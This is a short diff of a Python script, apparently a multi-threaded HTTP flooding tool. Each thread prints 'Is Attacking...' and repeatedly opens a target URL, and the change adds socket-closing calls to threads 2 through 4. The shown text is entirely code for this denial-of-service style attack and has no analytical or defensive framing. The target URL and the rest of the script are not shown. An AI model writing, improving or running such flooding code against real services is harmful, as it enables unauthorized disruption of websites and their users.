@@ -37,6 +37,7 @@ def thread2():
         connect = urllib.request.urlopen(url)
         output = connect.read()
         connect.close()
+        s.close()
 
 def thread3():
     print(">>Thread3 Is Attacking...\n")
@@ -49,6 +50,7 @@ def thread3():
         connect = urllib.request.urlopen(url)
         output = connect.read()
         connect.close()
+        s.close()
 
 def thread4():
     print(">>Thread4 Is Attacking...\n")
@@ -61,6 +63,7 @@ def thread4():
         connect = urllib.request.urlopen(url)
         output = connect.read()
         connect.close()
+        s.close()
 
 
 t1 = threading.Thread(target = thread1 , name = "run1")
